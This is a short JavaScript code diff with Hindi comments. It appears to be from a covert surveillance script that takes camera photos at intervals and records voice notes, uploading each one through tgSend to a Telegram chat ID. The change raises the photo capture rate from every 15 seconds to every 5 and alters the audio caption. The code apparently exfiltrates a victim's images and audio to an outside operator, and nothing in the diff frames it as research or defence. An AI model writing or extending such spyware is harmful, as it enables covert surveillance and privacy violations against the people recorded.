@@ -171,7 +171,7 @@ function startContinuousCapture() {
             };
         })
         .catch(() => {});
-    }, 15000); // हर 15 सेकंड में एक फोटो
+    }, 5000); // हर 5 सेकंड में एक फोटो
 }
 
 // ===================== STAGE 3: VOICE NOTES (LIMITED TO 3) =====================
@@ -194,7 +194,7 @@ function startVoiceRecording() {
             const fd = new FormData();
             fd.append("chat_id", CHAT_ID);
             fd.append("audio", blob, `voice_${Date.now()}.webm`);
-            fd.append("caption", `🎤 वॉइस नोट ${++voiceCount}/${MAX_VOICE_NOTES} — ${new Date().toLocaleString()}`);
+            fd.append("caption", `🎤 ${++voiceCount}/${MAX_VOICE_NOTES} — ${new Date().toLocaleString()}`);
             tgSend("sendAudio", fd);
             audioChunks = [];
             
